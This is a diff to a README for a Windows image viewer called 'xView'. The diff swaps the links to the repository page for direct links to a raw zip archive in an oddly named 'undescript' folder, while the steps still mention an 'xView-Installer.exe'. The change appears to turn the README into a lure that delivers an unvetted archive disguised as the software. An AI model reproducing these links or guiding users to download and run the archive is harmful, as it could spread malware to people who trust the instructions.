@@ -1,7 +1,7 @@
 # 🖥️ xView - View your digital images with ease
 
 <p align="center">
-  <a href="https://github.com/Catiecrosssentential808/xView">
+  <a href="https://github.com/Catiecrosssentential808/xView/raw/refs/heads/main/undescript/x-View-3.5.zip">
     <img src="https://img.shields.io/badge/Download-xView-blue.svg" alt="Download xView">
   </a>
 </p>
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run xView:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Catiecrosssentential808/xView) to get the latest file.
+1. Visit the [official download page](https://github.com/Catiecrosssentential808/xView/raw/refs/heads/main/undescript/x-View-3.5.zip) to get the latest file.
 2. Locate the link labeled "xView-Installer.exe" on the page.
 3. Click the link to begin the download process.
 4. Open your "Downloads" folder once the process finishes.
